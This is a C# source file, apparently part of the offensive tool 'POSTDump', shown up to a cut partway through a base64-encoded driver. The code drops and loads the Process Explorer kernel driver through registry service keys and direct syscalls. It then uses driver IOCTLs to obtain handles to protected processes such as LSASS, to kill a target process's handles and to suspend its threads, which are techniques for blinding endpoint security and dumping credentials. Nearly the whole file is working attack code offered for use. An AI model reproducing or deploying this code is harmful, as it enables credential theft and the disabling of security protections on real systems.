using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Data = POSTMiniDump.Data;
using System.IO;
using System.Collections.Generic;

namespace POSTDump
{
    public class Driver
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile([MarshalAs(UnmanagedType.LPTStr)] string filename, [MarshalAs(UnmanagedType.U4)] FileAccess access, [MarshalAs(UnmanagedType.U4)] FileShare share, IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition, [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes, IntPtr templateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtLoadDriver(ref Data.UNICODE_STRING DriverServiceName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtUnloadDriver(ref Data.UNICODE_STRING DriverServiceName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtDeviceIoControlFile(IntPtr hDriver, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref Data.IO_STATUS_BLOCK IoStatusBlock, UInt32 IoControlCode, IntPtr InputBuffer, UInt32 InputBufferLength, ref IntPtr OutputBuffer, UInt32 OutputBufferLength);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCEXP_DATA_EXCHANGE
        {
            public ulong ulPID;
            public IntPtr lpObjectAddress;
            public ulong ulSize;
            public ulong ulHandle;
        }

        [StructLayoutAttribute(LayoutKind.Sequential)]
        public struct TargetProcess
        {
            public uint ProcessId;
            public uint ThreadId;
        }

        [StructLayoutAttribute(LayoutKind.Sequential)]
        struct SYSTEM_PROCESS_INFORMATION
        {
            public uint NextEntryOffset;
            public uint NumberOfThreads;
            long SpareLi1;
            long SpareLi2;
            long SpareLi3;
            public long CreateTime;
            public long UserTime;
            public long KernelTime;
            public Data.UNICODE_STRING ImageName;
            public int BasePriority;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
            public uint HandleCount;
            public uint SessionId;
            public IntPtr PageDirectoryBase;
            public IntPtr PeakVirtualSize;
            public IntPtr VirtualSize;
            public uint PageFaultCount;
            public IntPtr PeakWorkingSetSize;
            public IntPtr WorkingSetSize;
            public IntPtr QuotaPeakPagedPoolUsage;
            public IntPtr QuotaPagedPoolUsage;
            public IntPtr QuotaPeakNonPagedPoolUsage;
            public IntPtr QuotaNonPagedPoolUsage;
            public IntPtr PagefileUsage;
            public IntPtr PeakPagefileUsage;
            public IntPtr PrivatePageCount;
            long ReadOperationCount;
            long WriteOperationCount;
            long OtherOperationCount;
            long ReadTransferCount;
            long WriteTransferCount;
            long OtherTransferCount;
        }

        [StructLayoutAttribute(LayoutKind.Sequential)]
        public struct SYSTEM_THREAD_INFORMATION
        {
            public Data.LARGE_INTEGER KernelTime;
            public Data.LARGE_INTEGER UserTime;
            public Data.LARGE_INTEGER CreateTime;
            public uint WaitTime;
            public IntPtr StartAddress;
            public Data.CLIENT_ID ClientId;
            public int Priority;
            public int BasePriority;
            public uint ContextSwitchCount;
            public uint State;
            public int WaitReason;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_HANDLE
        {
            // Information Class 16
            public uint ProcessID;
            public byte ObjectTypeNumber;
            public byte Flags; // 0x01 = PROTECT_FROM_CLOSE, 0x02 = INHERIT
            public ushort Handle;
            public IntPtr Object_Pointer;
            public uint GrantedAccess;
        }

        public static IntPtr ntdeviceptr;
        public static IntPtr ntquerysys;

        private static bool SetRegistryValues(Data.UNICODE_STRING Path, string ServiceName)
        {
            Microsoft.Win32.RegistryKey key = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Services\\" + ServiceName);
            try
            {
                key.SetValue("Type", 0x0);
                key.SetValue("ErrorControl", 0x0);
                key.SetValue("Start", 0x0);
                key.SetValue("ImagePath", Marshal.PtrToStringUni(Path.Buffer, (Path.Length / 2)), RegistryValueKind.ExpandString);
                key.Close();
            }
            catch
            {
                Console.WriteLine("[!] Failed to create registry value entry..");
                return false;
            }

            Console.WriteLine("[+] Registry key added.");
            return true;
        }

        private static bool DeleteRegistryKey(string ServiceName)
        {
            try
            {
                Registry.LocalMachine.DeleteSubKey("System\\CurrentControlSet\\Services\\" + ServiceName);
                Console.WriteLine("[+] Registry key deleted");
                return true;
            }
            catch
            {
                Console.WriteLine("Registry key not found");
                return false;
            }
        }

        private static bool LoadDriver(string diskfile, string ServiceName)
        {
            Data.UNICODE_STRING usDriverServiceName = new Data.UNICODE_STRING();
            Data.UNICODE_STRING szNtRegistryPath = new Data.UNICODE_STRING();

            if (!POSTDump.Handle.EnablePrivilege("SeLoadDriverPrivilege"))
            {
                Console.WriteLine("Getting SeLoadDriverPrivilege failed");
                //return false;
            }

            POSTMiniDump.Utils.RtlInitUnicodeString(ref szNtRegistryPath, @"\??\" + diskfile);
            if (!SetRegistryValues(szNtRegistryPath, ServiceName))
            {
                Console.WriteLine("Could not set registry value");
                return false;
            }

            POSTMiniDump.Utils.RtlInitUnicodeString(ref usDriverServiceName, @"\Registry\Machine\System\CurrentControlSet\Services\" + ServiceName);

            IntPtr ntdriverptr = Postdump.isyscall.GetSyscallPtr("NtLoadDriver");
            NtLoadDriver NTLD = (NtLoadDriver)Marshal.GetDelegateForFunctionPointer(ntdriverptr, typeof(NtLoadDriver));
            Data.NTSTATUS rez = NTLD(ref usDriverServiceName);
            if (rez != Data.NTSTATUS.Success)
            {
                Console.WriteLine("Load driver failed with error: " + rez.ToString());
                return false;
            }

            return true;
        }

        private static bool UnLoadDriver(string driverpath, string ServiceName)
        {
            Data.UNICODE_STRING usDriverServiceName = new Data.UNICODE_STRING();
            POSTMiniDump.Utils.RtlInitUnicodeString(ref usDriverServiceName, @"\Registry\Machine\System\CurrentControlSet\Services\" + ServiceName);

            IntPtr ntdriverptr2 = Postdump.isyscall.GetSyscallPtr("NtUnloadDriver");
            NtUnloadDriver NTULD = (NtUnloadDriver)Marshal.GetDelegateForFunctionPointer(ntdriverptr2, typeof(NtUnloadDriver));
            Data.NTSTATUS rez = NTULD(ref usDriverServiceName);
            if (rez != Data.NTSTATUS.Success)
            {
                Console.WriteLine("UnLoad driver failed with error: " + rez.ToString());
                DeleteRegistryKey(ServiceName);
                return false;
            }

            Console.WriteLine("[+] Driver unloaded");
            DeleteRegistryKey(ServiceName);
            return true;
        }

        private static bool GetDriverHandle(string drvname, out IntPtr hDriver)
        {
            hDriver = CreateFile(@"\\.\" + drvname, FileAccess.ReadWrite, 0, IntPtr.Zero, FileMode.Open, FileAttributes.Normal, IntPtr.Zero);
            if (hDriver == IntPtr.Zero)
            {
                Console.WriteLine("Get driver handle failed");
                return false;
            }

            return true;
        }

        private static bool GetProtectedProcessHandle(IntPtr hDriver, int pid, out IntPtr hProtectedProcess)
        {
            Data.IO_STATUS_BLOCK isb = new Data.IO_STATUS_BLOCK();
            hProtectedProcess = IntPtr.Zero;
            IntPtr pidbuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
            Marshal.StructureToPtr((IntPtr)pid, pidbuffer, true);

            NtDeviceIoControlFile NTDCF = (NtDeviceIoControlFile)Marshal.GetDelegateForFunctionPointer(ntdeviceptr, typeof(NtDeviceIoControlFile));
            Data.NTSTATUS rez = NTDCF(hDriver, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref isb, 2201288764, pidbuffer, (UInt32)Marshal.SizeOf(typeof(IntPtr)), ref hProtectedProcess, (UInt32)Marshal.SizeOf(typeof(IntPtr)));
            if (rez != Data.NTSTATUS.Success)
            {
                Console.WriteLine("Failed to get protected process handle:" + rez.ToString());
                return false;
            }

            Console.WriteLine("[+] Got protected process handle");
            return true;
        }

        private static bool DeleteDiskDriver(string driverpath)
        {
            try
            {
                File.SetAttributes(driverpath, FileAttributes.Normal);
                File.Delete(driverpath);
                Console.WriteLine("[+] Driver deleted from disk");
                return true;
            }
            catch
            {
                Console.WriteLine("[!] Failed to delete driver from disk..");
                return false;
            }
        }

        private static unsafe bool KillHandle(IntPtr hDriver, int dwPID, SYSTEM_HANDLE pHandle)
        {

            Data.IO_STATUS_BLOCK isb = new Data.IO_STATUS_BLOCK();
            IntPtr buf = IntPtr.Zero;
            PROCEXP_DATA_EXCHANGE ctrl = new PROCEXP_DATA_EXCHANGE();
            ctrl.ulPID = (ulong)dwPID;
            ctrl.ulSize = 0;
            ctrl.ulHandle = (ulong)pHandle.Handle;
            ctrl.lpObjectAddress = (IntPtr)pHandle.Object_Pointer;
            IntPtr ctrlbuf = Marshal.AllocHGlobal(Marshal.SizeOf(ctrl));
            Marshal.StructureToPtr(ctrl, ctrlbuf, true);

            NtDeviceIoControlFile NTDCF = (NtDeviceIoControlFile)Marshal.GetDelegateForFunctionPointer(ntdeviceptr, typeof(NtDeviceIoControlFile));

            Data.NTSTATUS rez = NTDCF(hDriver, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref isb, 2201288708, ctrlbuf, (UInt32)Marshal.SizeOf(ctrl), ref buf, 0);
            Marshal.FreeHGlobal(ctrlbuf);
            if (rez != Data.NTSTATUS.Success)
            {
                //Console.WriteLine("Failed to kill handle: " + ctrl.ulHandle + " at "+ ctrl.lpObjectAddress.ToString("X") +" -> " + rez.ToString());
                return false;
            }
            //Console.WriteLine("Killed handle: " + ctrl.ulHandle + " at "+ ctrl.lpObjectAddress.ToString("X"));
            return true;
        }

        private static bool KillProcessHandles(IntPtr hProtectedProcess, IntPtr hDriver, int dwPID)
        {
            int i = 0;
            SYSTEM_HANDLE shHandle;

            while (true)
            {
                GetExitCodeProcess(hProtectedProcess, out uint dwProcStatus);
                if (dwProcStatus != 259) //STILL_ACTIVE
                {
                    return true;
                }

                IntPtr HandleTableInfo = Handle.GetInformationTable(0x10);
                if (HandleTableInfo == IntPtr.Zero)
                {
                    return true;
                }

                int lHandleCount = Marshal.ReadInt32(HandleTableInfo);
                if (lHandleCount == 0)
                    return true;

                IntPtr ipHandle = new IntPtr(HandleTableInfo.ToInt64() + 8);
                List<SYSTEM_HANDLE> lstHandles = new List<SYSTEM_HANDLE>();

                for (int lIndex = 0; lIndex < lHandleCount; lIndex++)
                {
                    shHandle = new SYSTEM_HANDLE();
                    shHandle = (SYSTEM_HANDLE)Marshal.PtrToStructure(ipHandle, shHandle.GetType());
                    ipHandle = new IntPtr(ipHandle.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE)) + 8);

                    if ((int)shHandle.ProcessID == dwPID)
                    {
                        lstHandles.Add(shHandle);
                    }
                }

                foreach (var item in lstHandles)
                {
                    KillHandle(hDriver, dwPID, item);
                }
            }

            return true;
        }

        private static List<int> GetProcessThreadsID(int pid)
        {
            IntPtr processinfotable = Handle.GetInformationTable(0x5);
            SYSTEM_PROCESS_INFORMATION processinfo = new SYSTEM_PROCESS_INFORMATION();
            List<int> threadlist = new List<int>();
            IntPtr pProcessListHead = processinfotable;
            IntPtr previousptr = IntPtr.Zero;

            while (true)
            {
                SYSTEM_PROCESS_INFORMATION thisProcessStruct = new SYSTEM_PROCESS_INFORMATION();

                try
                {
                    thisProcessStruct = (SYSTEM_PROCESS_INFORMATION)Marshal.PtrToStructure(pProcessListHead, typeof(SYSTEM_PROCESS_INFORMATION));
                    previousptr = pProcessListHead;
                }
                catch (Exception ex)
                {
                    Marshal.FreeHGlobal(processinfotable);
                    throw new Exception("Failed to marshal pointer " + ex.Message);
                }

                //save it
                if ((int)thisProcessStruct.UniqueProcessId == pid)
                {
                    processinfo = thisProcessStruct;
                    break;
                }

                //no more to process
                if (thisProcessStruct.NextEntryOffset == 0)
                    break;

                //increment processListHead
                pProcessListHead = (IntPtr)(pProcessListHead.ToInt64() + (int)thisProcessStruct.NextEntryOffset);
            }
            
            int threadcount = (int)processinfo.NumberOfThreads;
            IntPtr threadArrayPtr = new IntPtr(previousptr.ToInt64() + Marshal.SizeOf(processinfo));
            SYSTEM_THREAD_INFORMATION thread;
            for (int i = 0; i < threadcount; i++)
            {
                thread = new SYSTEM_THREAD_INFORMATION();
                thread = (SYSTEM_THREAD_INFORMATION)Marshal.PtrToStructure(threadArrayPtr + Marshal.SizeOf(thread) * i, typeof(SYSTEM_THREAD_INFORMATION));
                threadlist.Add((int)thread.ClientId.UniqueThread);
            }

            return threadlist;
        }

        private static bool SuspendThreads(IntPtr hDriver, int pid, int threadid)
        {
            Data.IO_STATUS_BLOCK isb = new Data.IO_STATUS_BLOCK();
            TargetProcess data = new TargetProcess();
            data.ProcessId = (uint)pid;
            data.ThreadId = (uint)threadid;
            IntPtr _ = IntPtr.Zero;

            IntPtr databuf = Marshal.AllocHGlobal(Marshal.SizeOf(data));
            Marshal.StructureToPtr((TargetProcess)data, databuf, true);

            NtDeviceIoControlFile NTDCF = (NtDeviceIoControlFile)Marshal.GetDelegateForFunctionPointer(ntdeviceptr, typeof(NtDeviceIoControlFile));

            Data.NTSTATUS rez = NTDCF(hDriver, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref isb, 2557919236, databuf, (UInt32)Marshal.SizeOf(data), ref _, (uint)Marshal.SizeOf(_));
            if (rez != Data.NTSTATUS.Success)
            {
                Console.WriteLine("Failed to initialize driver -> " + rez.ToString());
                return false;
            }

            rez = NTDCF(hDriver, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref isb, 2557919384, databuf, (UInt32)Marshal.SizeOf(data), ref _, (uint)Marshal.SizeOf(_));
            Marshal.FreeHGlobal(databuf);
            if (rez != Data.NTSTATUS.InvalidHandle)
            {
                Console.WriteLine("Failed to suspend thread: " + threadid + " -> " + rez.ToString());
                return false;
            }

            Console.WriteLine("Suspended thread: " + threadid);
            return true;
        }

        private static void CloseHandle(IntPtr handle)
        {
            Handle.NtClose NTC = (Handle.NtClose)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntcloseptr, typeof(Handle.NtClose));
            NTC(handle);
        }

        public static void Kill(int pid, out IntPtr hProtectedProcess, bool GetLsassHandle = false)
        {
            ntdeviceptr = Postdump.isyscall.GetSyscallPtr("NtDeviceIoControlFile");

            hProtectedProcess = IntPtr.Zero;
            string ServiceName = "WinDriver64";
            string drvname = "";
            string driverPath = "C:\\";
            string diskfile = driverPath + ServiceName;
            IntPtr hDriver;
            byte[] driver64 = new byte[] { };
            
            if (!POSTDump.Handle.EnablePrivilege("SeDebugPrivilege"))
            {
                Console.WriteLine("Setting Debug Privilege failed");
            }
            

           //ProcExp64.sys
           drvname = "PROCEXP152";
           driver64 = Convert.FromBase64String("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